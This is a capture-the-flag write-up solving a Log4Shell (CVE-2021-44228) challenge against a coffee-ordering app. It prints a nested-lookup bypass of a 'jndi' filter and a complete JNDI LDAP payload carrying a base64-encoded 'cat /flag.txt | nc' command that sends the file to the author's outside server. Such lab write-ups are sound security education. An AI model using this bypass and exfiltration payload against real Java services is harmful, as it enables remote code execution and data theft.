# log4coffee
 
**Date**: 01-07-26

**Author**: Lukas Somwong  

**Platform**: DAMSEC CTF League

**Category**: misc

**Flags:** 1

## Overview

Before this challenge, I went over the JNDI vulnerability log4shell or `CVE-2021-44228` which allowed attackers to load and execute arbitrary code through log4j logging, which is a common logging library used by Java developers. 

For this challenge, I was provided a JNDI exploit server endpoint (log4j.ctf-league.osusec.org) and a vulnerable application (log4coffee.ctf-league.osusec.org/) alongside a zip file of its source code. Though this challenge, I learned how to exploit this vulneraility on our own and got a flag in the process.

## Solution

On the web application, I observed that I could enter a coffee id, quantity, and comments. 

![](<images/Screenshot 2026-01-08 at 2.23.57 PM.png>)

Submitting our order simply displayed a receipt of our input. I decided to look at the source code provided to us.

![](<images/Screenshot 2026-01-08 at 2.25.11 PM.png>)

Within a `CoffeeController.java` file, I found the source code for the `/order` endpoint which we were accessing. The ID and quantity entered had to be decimals, but the comment could be a string. More interestingly, the endpoint denied a comment which contained "jndi". 

The Log4j logging library allows for lookups within log messages, allowing for more dynamic logs. For example, a log might need to include the user's home directory:

`logger.info("The user's home directory is at ${sys:user.home}")`

The issue with this was that it allowed for the use of JNDI, a Java API which allows for lookup of outside resources. Attackers could insert a JNDI call to an outside resource, such as an LDAP server the attacker is hosting arbitrary Java code on, which would get executed on the remote server.

Tracing back to the source code that I looked at earlier, I can see why the developer of this coffee application wanted to filter out any instances of the "jndi" string, but this filter could get easily bypassed. 

By using a nested lookup, I could still utilize jndi by constructing its name AFTER the filter.  

`{${lower:j}ndi:...}`

I was provided with an already configured LDAP server with jndiexploit, so I simply needed to reference its location and use one of the available queries, such as `ldap://127.0.0.1:1389/Basic/Command/Base64/` which I would include with a base64-encoded command I want to execute.

Like many CTFs, I assume that my goal is to locate and retrieve the contents of a flag.txt file. I couldn't simply use `cat` to read the text file because the application did not return anything besides what we typed out in the comment exactly.

I needed the coffee application to reach out to me and give me the flag. To do this, I used `nc` to open up a port on my externally-accesible server and crafted a JNDI lookup that would read the flag.txt file and send the contents to me.

`cat /flag.txt | nc flip2.engr.oregonstate.edu 44444`

Base64 encoded:

`Y2F0IC9mbGFnLnR4dCB8IG5jIGZsaXAyLmVuZ3Iub3JlZ29uc3RhdGUuZWR1IDQ0NDQ0`

JNDI lookup:

`${${lower:j}ndi:ldap://log4j.ctf-league.osusec.org:1389/Basic/Command/Base64/Y2F0IC9mbGFnLnR4dCB8IG5jIGZsaXAyLmVuZ3Iub3JlZ29uc3RhdGUuZWR1IDQ0NDQ0}
`

I inputted this string into the comment field and submitted, and shortly after received the flag through my open port.

![](<images/Screenshot 2026-01-07 at 8.02.00 PM.png>)